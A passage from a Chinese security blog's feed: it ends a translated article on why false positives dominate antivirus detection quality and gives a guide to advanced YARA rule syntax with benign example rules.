rel="noopener">瑞士奶酪防御模型</a>，其中的含义在这里很有意义。</p><p>理解了瑞士奶酪防御模型就可以理解为什么误报比漏报要糟糕的多，未检测到的恶意软件可以最终被其他层检测到。因此，单个图层的低检测率没有关系，只要其他层填补了这个空缺。但对于误报，没有类似的层层网络。但是你可能会问 <strong>“白名单呢”？</strong>。</p><p>虽然白名单机制是一定存在，但是它必须被视为最后的手段，并谨慎使用，主要有如下原因：</p><ol><li>首先，白名单列表可能为恶意软件逃避杀毒软件检测敞开大门。如果程序的证书、关键字、行为或其他特征被用于允许列表，恶意软件也可以滥用它们。出于同样的原因，某些程序不能被加入白名单，例如，它们是合法和恶意文件都能使用的执行环境的一部分；或者因为它们只在某些上下文中是干净的。这类程序比比皆是，例如，远程访问工具在实际提供帮助时是可以的，但如果被攻击者静默安装，则不那么好。</li><li>第二，其次，合法程序每天都在演变和出现新版本或类似程序。因此，仅针对特定版本的白名单条目不是一个长期解决方案。为了调整易产生误报的检测启发式算法，几乎肯定要定期添加其他允许列表条目，这是一项维护量很大的工作。</li></ol><p>通常，预防层的误报就是整个产品的误报，相比之下，漏报可以随意高，只要恶意代码检测层的性能能够及时的覆盖掉新出现的恶意软件即可。</p><h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><p>启发式恶意代码检测看起来非常简单，但实际上是很棘手的。虽然许多人认为高的恶意软件检出率是主要目标，但低误报率是检测启发式检测质量的最重要指标。误报率的影响常常由于<strong>基本利率谬误</strong>所被低估。</p><p>在杀软产品上，误报必须是可管理的，相应的容忍率肯定要低于0.001%。单个技术的误漏率不是那么重要，只要启发式检测覆盖了瑞士奶酪防御模型中的一些洞即可。</p><p>我希望检测技术研究能够专门关注难以检测的样本，并找到实际解决方案，而不是试图创造我们德国人称之为“会下蛋，会生产乳汁的绵羊”。永远不会有一种技术可以统治所有技术。</p><p>我也希望记者和安全影响者理解抗病毒技术的状态和检测研究的实际价值，以便他们停止加强这种误解。抗病毒营销也是一样，过时的检测技术的神话可能很好地诋毁竞争对手，但长期来看对抗病毒行业产生了不利影响。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[ange] Ange Albertini, <em>Corkami</em>, Google Code project, <a href="https://code.google.com/archive/p/corkami/" target="_blank" rel="noopener">https://code.google.com/archive/p/corkami/</a> now moved to <a href="https://github.com/corkami" target="_blank" rel="noopener">https://github.com/corkami</a></p><p>[arp20] Daniel Arp et al, 2020<em>, Dos and Don’ts of Machine Learning in Computer Security,</em> <a href="https://www.researchgate.net/publication/344757244_Dos_and_Don&#39;ts_of_Machine_Learning_in_Computer_Security" target="_blank" rel="noopener">https://www.researchgate.net/publication/344757244_Dos_and_Don&#39;ts_of_Machine_Learning_in_Computer_Security</a></p><p>[art1] <a href="https://securityboulevard.com/2021/09/why-antivirus-is-not-enough-the-sandbox-is-dead-turning-the-corner-with-malware-prevention" target="_blank" rel="noopener">https://securityboulevard.com/2021/09/why-antivirus-is-not-enough-the-sandbox-is-dead-turning-the-corner-with-malware-prevention</a></p><p>[art2] <a href="https://venturebeat.com/2021/02/22/antivirus-is-dead-the-rising-enterprise-security-threats-for-2021-and-how-to-protect-against-them/" target="_blank" rel="noopener">https://venturebeat.com/2021/02/22/antivirus-is-dead-the-rising-enterprise-security-threats-for-2021-and-how-to-protect-against-them/</a></p><p>[art3] <a href="https://slate.com/technology/2017/02/why-you-cant-depend-on-antivirus-software-anymore.html" target="_blank" rel="noopener">https://slate.com/technology/2017/02/why-you-cant-depend-on-antivirus-software-anymore.html</a></p><p>[axelsson00] Stefan Axelsson, 2000, <em>The Base-Rate Fallacy and the Difficulty of Intrusion Detection</em>, <a href="https://dl.acm.org/doi/pdf/10.1145/357830.357849" target="_blank" rel="noopener">https://dl.acm.org/doi/pdf/10.1145/357830.357849</a></p><p>[bramac18] Jan Brabec and Lukas Machlica, 2018, <em>Bad practices in evaluation methodology relevant to class-imbalanced problems</em>, <a href="https://arxiv.org/abs/1812.01388" target="_blank" rel="noopener">https://arxiv.org/abs/1812.01388</a></p><p>[cohen84] Fred Cohen, 1984, <em>Prevention of Computer Viruses</em>, <a href="https://web.eecs.umich.edu/~aprakash/eecs588/handouts/cohen-viruses.html" target="_blank" rel="noopener">https://web.eecs.umich.edu/~aprakash/eecs588/handouts/cohen-viruses.html</a></p><p>[hahn14] Karsten Philipp Boris Hahn (previously Katja Hahn), 2014, <em>Robust Static Analysis of Portable Executable Malware</em>, <a href="https://www.researchgate.net/publication/350722779_Robust_Static_Analysis_of_Portable_Executable_Malware" target="_blank" rel="noopener">https://www.researchgate.net/publication/350722779_Robust_Static_Analysis_of_Portable_Executable_Malware</a></p><p>[szor05] Péter Szőr, February 2005, <em>The Art of Computer Virus Research and Defense,</em> Addison Wesley Professional</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;原文地址: &lt;a href=&quot;https://www.gdatasoftware.com/blog/2022/06/37445-malware-detection-is-hard&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.gdatasoftware.com/blog/2022/06/37445-malware-detection-is-hard&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;科研人员开发的人工智能检测引擎具有98% 的恶意软件检测率和5% 的假阳性率。如果您认为这是一种非常好的防病毒软件技术，那么本文可能会改变您的想法。&lt;/p&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="binary" scheme="http://blog.wonderkun.cc/tags/binary/"/>
    
      <category term="malware" scheme="http://blog.wonderkun.cc/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>yara匹配引擎进阶语法指南</title>
    <link href="http://blog.wonderkun.cc/2023/02/07/yara%E5%8C%B9%E9%85%8D%E5%BC%95%E6%93%8E%E8%BF%9B%E9%98%B6%E8%AF%AD%E6%B3%95%E6%8C%87%E5%8D%97/"/>
    <id>http://blog.wonderkun.cc/2023/02/07/yara匹配引擎进阶语法指南/</id>
    <published>2023-02-07T08:16:34.000Z</published>
    <updated>2024-11-18T11:46:14.718Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>具备检测相关经验的同学可能都对yara匹配引擎比较熟悉了，看雪论坛上也有非常详细的翻译文章 - <a href="https://bbs.kanxue.com/thread-226011.htm" target="_blank" rel="noopener">编写Yara规则检测恶意软件</a><br>本文主要对yara文档容易被忽略的部分进行了翻译和总结，并且给出一些进阶用法的例子，提高对yara匹配引擎语法的理解程度。</p><a id="more"></a><p><strong><br /></strong>参考文档：**<br /><br><a href="https://yara.readthedocs.io/en/v4.2.3/writingrules.html" target="_blank" rel="noopener">https://yara.readthedocs.io/en/v4.2.3/writingrules.html</a></p><h2 id="匹配字符串"><a href="#匹配字符串" class="headerlink" title="匹配字符串"></a>匹配字符串</h2><p>yara的匹配字符串可以使用一些修饰符，总结下来有如下部分：</p><table><thead><tr><th>关键词</th><th>支持的字符串类型</th><th>概括</th><th>限制</th></tr></thead><tbody><tr><td>nocase</td><td>文本，正则表达式</td><td>忽略大小写</td><td>不能与xor、base64、 或base64wide一起使用</td></tr><tr><td>wide</td><td>文本，正则表达式</td><td>通过交错空 (0x00) 字符来模拟 UTF16</td><td>无</td></tr><tr><td>ascii</td><td>文本，正则表达式</td><td>匹配 ASCII 字符，仅在wide使用时才需要</td><td>无</td></tr><tr><td>xor</td><td>文本</td><td>匹配具有单字节键的 XOR 文本字符串</td><td>不能与nocase、base64、 或base64wide一起使用</td></tr><tr><td>base64</td><td>文本</td><td>base64 编码的字符串(分割成3条)</td><td>不能与nocase、xor、 或fullword一起使用</td></tr><tr><td>base64wide</td><td>文本</td><td>base64 编码的字符串(分割成3条)，然后交错空字符，如 wide</td><td>不能与nocase、xor、 或fullword一起使用</td></tr><tr><td>fullword</td><td>文本，正则表达式</td><td>匹配前后没有字母数字挨着的字符(串)</td><td>不能与base64或一起使用base64wide一起使用</td></tr><tr><td>private</td><td>十六进制、文本、正则表达式</td><td>匹配不包含在输出中</td><td>无</td></tr></tbody></table><h3 id="base64修饰符"><a href="#base64修饰符" class="headerlink" title="base64修饰符"></a>base64修饰符</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule Base64Example1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">"This program cannot"</span> base64</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="variable">$a</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将至少会匹配如下三个字符串：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VGhpcyBwcm9ncmFtIGNhbm5vd</span><br><span class="line">RoaXMgcHJvZ3JhbSBjYW5ub3</span><br><span class="line">UaGlzIHByb2dyYW0gY2Fubm90</span><br></pre></td></tr></table></figure><p>看起来很奇怪，原因如下：<br /><strong>base64是将三个字节变成四个字节，如果不能被整除，那就会涉及到补位，同样的字符串可能因为前缀的不一样导致编码结果不同，这个不一致的循环次数是3，看如下的编码结果就明白了。</strong><br /><img src="https://intranetproxy.alipay.com/skylark/lark/0/2022/png/327065/1665999287509-f33ed94f-782d-45be-b663-a578bd599ca0.png#clientId=u4e5591a9-74b3-4&errorMessage=unknown%20error&from=paste&height=208&id=ua1026f3d&name=image.png&originHeight=416&originWidth=980&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97137&status=error&style=none&taskId=u30985312-8284-481f-b866-65b93522771&title=&width=490" alt="image.png"><br />三个结果对应这三个不同前缀。<br/>详情请阅读文档：<a href="https://www.leeholmes.com/searching-for-content-in-base-64-strings/" target="_blank" rel="noopener">https://www.leeholmes.com/searching-for-content-in-base-64-strings/</a><br />另外base64和base64wide修饰符支持自定义的字符码表，可以匹配一些被修改过的base64编码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule Base64Example2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">"This program cannot"</span> base64(<span class="string">"!@#$%^&amp;*()&#123;&#125;[].,|ABCDEFGHIJ\x09LMNOPQRSTUVWXYZabcdefghijklmnopqrstu"</span>)</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="variable">$a</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="XOR修饰符"><a href="#XOR修饰符" class="headerlink" title="XOR修饰符"></a>XOR修饰符</h3><p>xor 修饰符是将声明的字符串按照 [0x01 - 0xFF] 都进行单字节异或，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule XorExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$xor_string</span> = <span class="string">"This program cannot"</span> xor</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="variable">$xor_string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rule XorExample2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$xor_string_00</span> = <span class="string">"This program cannot"</span></span><br><span class="line">        <span class="variable">$xor_string_01</span> = <span class="string">"Uihr!qsnfs`l!b`oonu"</span>  // xor 0x1 </span><br><span class="line">        <span class="variable">$xor_string_02</span> = <span class="string">"Vjkq\"rpmepco\"acllmv"</span> // xor 0x2 </span><br><span class="line">        // Repeat <span class="keyword">for</span> every single byte XOR</span><br><span class="line">    condition:</span><br><span class="line">        any of them</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外还支持参数，限定xor的范围：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rule XorExample5</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$xor_string</span> = <span class="string">"This program cannot"</span> xor(0x01-0x3F)</span><br><span class="line">    condition:</span><br><span class="line">        <span class="variable">$xor_string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="匹配条件的语法"><a href="#匹配条件的语法" class="headerlink" title="匹配条件的语法"></a>匹配条件的语法</h2><h3 id="支持的运算符"><a href="#支持的运算符" class="headerlink" title="支持的运算符"></a>支持的运算符</h3><p>所有运算符的优先级如下：</p><table><thead><tr><th>优先级</th><th>操作</th><th>描述</th><th>性质</th></tr></thead><tbody><tr><td>1</td><td><strong>[]</strong><br /><strong>.</strong></td><td>Array subscripting   数组下标<br />Structure member access  结构成员访问</td><td>从左到右</td></tr><tr><td>2</td><td><strong>–</strong><br /><strong>~</strong></td><td>Unary minus  按位减<br />Bitwise not  按位非</td><td>从右到左</td></tr><tr><td>3</td><td><strong>***<br /></strong>\<strong><br /></strong>%**</td><td>Multiplication  乘法<br />Division  除法<br />Remainder  取余</td><td>从左到右</td></tr><tr><td>4</td><td><strong>+</strong><br /><strong>–</strong></td><td>Addition  加法<br />Subtraction  减法</td><td>从左到右</td></tr><tr><td>5</td><td><strong>&lt;&lt;</strong><br /><strong>&gt;&gt;</strong></td><td>Bitwise left shift  按位左移<br />Bitwise right shift  按位右移</td><td>从左到右</td></tr><tr><td>6</td><td><strong>&amp;</strong></td><td>Bitwise AND  按位与</td><td>从左到右</td></tr><tr><td>7</td><td><strong>^</strong></td><td>Bitwise XOR  按位异或</td><td>从左到右</td></tr><tr><td>8</td><td><strong>&#124;</strong></td><td>Bitwise OR  按位或</td><td>从左到右</td></tr><tr><td>9</td><td><strong>&lt;</strong><br /><strong>&lt;=</strong><br /><strong>&gt;</strong><br /><strong>&gt;=</strong></td><td>Less than  小于<br />Less than or equal to  小于等于<br />Greater than  大于<br />Greater than or equal to  大于等于</td><td>从左到右</td></tr><tr><td>10</td><td><strong>==</strong><br /><strong>!=</strong><br /><strong>contains</strong><br /><strong>icontains</strong><br /><strong>startswith</strong><br /><strong>istartswith</strong><br /><strong>endswith</strong><br /><strong>iendswith</strong><br /><strong>matches</strong></td><td>Equal to  等于<br />Not equal to  不等于<br />String contains substring  包含<br />Like contains but case-insensitive  包含不区分大小写<br />String starts with substring  以开始字符串<br />Like startswith but case-insensitive 以开始字符串不区分大小写<br />String ends with substring  以结尾字符串<br />Like endswith but case-insensitive  以结尾字符串区分大小写<br />String matches regular expression  正则表达式</td><td>从左到右</td></tr><tr><td>11</td><td><strong>not</strong></td><td>Logical NOT  逻辑非</td><td>从右到左</td></tr><tr><td>12</td><td><strong>and</strong></td><td>Logical AND  逻辑与</td><td>从左到右</td></tr><tr><td>13</td><td><strong>or</strong></td><td>Logical OR  逻辑或</td><td>从左到右</td></tr></tbody></table><h3 id="字符串计数"><a href="#字符串计数" class="headerlink" title="字符串计数"></a>字符串计数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule CountExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">"dummy1"</span></span><br><span class="line">        <span class="variable">$b</span> = <span class="string">"dummy2"</span></span><br><span class="line">    condition:</span><br><span class="line">        <span class="comment">#a == 6 and #b &gt; 10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还能指定范围计数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#a in (filesize-500..filesize) == 2</span></span><br></pre></td></tr></table></figure><h3 id="字符串偏移或者虚拟地址"><a href="#字符串偏移或者虚拟地址" class="headerlink" title="字符串偏移或者虚拟地址"></a>字符串偏移或者虚拟地址</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rule AtExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">"dummy1"</span></span><br><span class="line">        <span class="variable">$b</span> = <span class="string">"dummy2"</span></span><br><span class="line">    condition:</span><br><span class="line">        <span class="variable">$a</span> at 100 and <span class="variable">$b</span> at 200</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rule InExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">"dummy1"</span></span><br><span class="line">        <span class="variable">$b</span> = <span class="string">"dummy2"</span></span><br><span class="line">    condition:</span><br><span class="line">        <span class="variable">$a</span> <span class="keyword">in</span> (0..100) and <span class="variable">$b</span> <span class="keyword">in</span> (100..filesize)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>取字符串第i次出现的偏移，<strong>注意只能用 == 运算符</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule AtExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">"dummy1"</span></span><br><span class="line">        <span class="variable">$b</span> = <span class="string">"dummy2"</span></span><br><span class="line">    condition:</span><br><span class="line">        @a[3] == 100 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="匹配长度"><a href="#匹配长度" class="headerlink" title="匹配长度"></a>匹配长度</h3><p>这个主要用于正则表达式，比如 <code>/fo*/</code>可以匹配字符串 ‘fo’, ‘foo’,’fooo’等，但是具体要选择哪一个呢？这里可以用!来去匹配长度：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rule MatchLength&#123;</span><br><span class="line">strings:</span><br><span class="line">    <span class="variable">$a</span> = /fo*/</span><br><span class="line">condition:</span><br><span class="line">  !a[1] == 4 // 匹配 fooo</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="访问指定位置的数据"><a href="#访问指定位置的数据" class="headerlink" title="访问指定位置的数据"></a>访问指定位置的数据</h3><p>使用以下函数从给定偏移量的文件中读取数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int8(&lt;offset or virtual address&gt;)</span><br><span class="line">int16(&lt;offset or virtual address&gt;)</span><br><span class="line">int32(&lt;offset or virtual address&gt;)</span><br><span class="line">uint8(&lt;offset or virtual address&gt;)</span><br><span class="line">uint16(&lt;offset or virtual address&gt;)</span><br><span class="line">uint32(&lt;offset or virtual address&gt;)</span><br><span class="line">int8be(&lt;offset or virtual address&gt;)</span><br><span class="line">int16be(&lt;offset or virtual address&gt;)</span><br><span class="line">int32be(&lt;offset or virtual address&gt;)</span><br><span class="line">uint8be(&lt;offset or virtual address&gt;)</span><br><span class="line">uint16be(&lt;offset or virtual address&gt;)</span><br><span class="line">uint32be(&lt;offset or virtual address&gt;)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule IsPE</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        // MZ signature at offset 0 and ...</span><br><span class="line">        uint16(0) == 0x5A4D and</span><br><span class="line">        // ... PE signature at offset stored <span class="keyword">in</span> MZ header at 0x3C</span><br><span class="line">        uint32(uint32(0x3C)) == 0x00004550</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串集合"><a href="#字符串集合" class="headerlink" title="字符串集合"></a>字符串集合</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2 of (<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>)</span><br><span class="line">all of them       // all strings <span class="keyword">in</span> the rule</span><br><span class="line">any of them       // any string <span class="keyword">in</span> the rule</span><br><span class="line">all of (<span class="variable">$a</span>*)      // all strings whose identifier starts by <span class="variable">$a</span></span><br><span class="line">any of (<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>) // any of <span class="variable">$a</span>, <span class="variable">$b</span> or <span class="variable">$c</span></span><br><span class="line">1 of ($*)         // same that <span class="string">"any of them"</span></span><br><span class="line">none of (<span class="variable">$b</span>*)     // zero of the <span class="built_in">set</span> of strings that start with <span class="string">"<span class="variable">$b</span>"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">all of (<span class="variable">$a</span>*) <span class="keyword">in</span> (filesize-500..filesize)</span><br><span class="line">any of (<span class="variable">$a</span>*, <span class="variable">$b</span>*) <span class="keyword">in</span> (1000..2000)</span><br></pre></td></tr></table></figure><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><h4 id="对多个字符串使用相同的条件"><a href="#对多个字符串使用相同的条件" class="headerlink" title="对多个字符串使用相同的条件"></a>对多个字符串使用相同的条件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> expression of string_set : ( boolean_expression )</span><br><span class="line"></span><br><span class="line">在集合string_set中，expression必须满足( boolean_expression )</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line"><span class="keyword">for</span> any of (<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>) : ( $ at pe.entry_point )</span><br><span class="line">布尔表达式中的 $ 符号不与任何特定字符串相关联，它将是 <span class="variable">$a</span>，然后是 <span class="variable">$b</span>，最后是 <span class="variable">$c</span></span><br></pre></td></tr></table></figure><p>其实这里可以发现any of 是一种简写:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">any of (<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>)</span><br><span class="line">等价于</span><br><span class="line"><span class="keyword">for</span> any of (<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>) : ( $ )</span><br></pre></td></tr></table></figure><p>在 expression 中也可以使用 @, # ,! 等运算符：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> all of them : ( <span class="comment"># &gt; 3 )</span></span><br><span class="line"><span class="keyword">for</span> all of (<span class="variable">$a</span>*) : ( @ &gt; @b )</span><br></pre></td></tr></table></figure><h4 id="迭代字符串"><a href="#迭代字符串" class="headerlink" title="迭代字符串"></a>迭代字符串</h4><p>可以使用以下语法访问给定字符串出现在文件或进程地址空间中的偏移量或虚拟地址：@a[i]，其中 i 是一个索引，指示出现了你所指的字符串 $a 。（@a[1]、@a[2]、…）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule Occurrences</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">"dummy1"</span></span><br><span class="line">        <span class="variable">$b</span> = <span class="string">"dummy2"</span></span><br><span class="line">    condition:</span><br><span class="line">        <span class="keyword">for</span> all i <span class="keyword">in</span> (1,2,3) : ( @a[i] + 10 == @b[i] )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上条件也可以写成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> all i <span class="keyword">in</span> (1..3) : ( @a[i] + 10 == @b[i]</span><br></pre></td></tr></table></figure><p>另一个规则：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> all i <span class="keyword">in</span> (1..<span class="comment">#a) : ( @a[i] &lt; 100 )   //#a 代表 $a 出现的次数</span></span><br></pre></td></tr></table></figure><p>还有可以限定满足条件的迭代次数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> 2 i <span class="keyword">in</span> (1..<span class="comment">#a) : ( @a[i] &lt; 100 )</span></span><br></pre></td></tr></table></figure><h4 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h4><p>在 YARA 4.0 中，for..of运算符得到了改进，现在它不仅可以用于迭代整数枚举和范围（例如：1,2,3,4 和 1..4），还可以用于任何类型的可迭代数据类型，例如YARA 模块定义的数组和字典。例如，以下表达式在 YARA 4.0 中有效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> any section <span class="keyword">in</span> pe.sections : ( section.name == <span class="string">".text"</span>）</span><br><span class="line"></span><br><span class="line">// 等价于</span><br><span class="line"><span class="keyword">for</span> any i <span class="keyword">in</span> (0..pe.number_of_sections-1) : ( pe.sections[i].name == <span class="string">".text"</span> )</span><br></pre></td></tr></table></figure><p>在迭代字典时，您必须提供两个变量名，它们将保存字典中每个条目的键和值，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> any k,v <span class="keyword">in</span> some_dict : ( k == <span class="string">"foo"</span> and v == <span class="string">"bar"</span> )</span><br></pre></td></tr></table></figure><h3 id="外部变量"><a href="#外部变量" class="headerlink" title="外部变量"></a>外部变量</h3><p>外部变量允许您定义依赖于外部提供的值的规则。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rule ExternalVariableExample1</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        ext_var == 10</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这种情况下ext_var是一个外部变量，其值在运行时分配。外部变量可以是以下类型：整数、字符串或布尔值；它们的类型取决于分配给它们的值。整数变量可以替代条件中的任何整数常量，布尔变量可以占据布尔表达式的位置。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rule ExternalVariableExample2</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        bool_ext_var or filesize &lt; int_ext_var</span><br><span 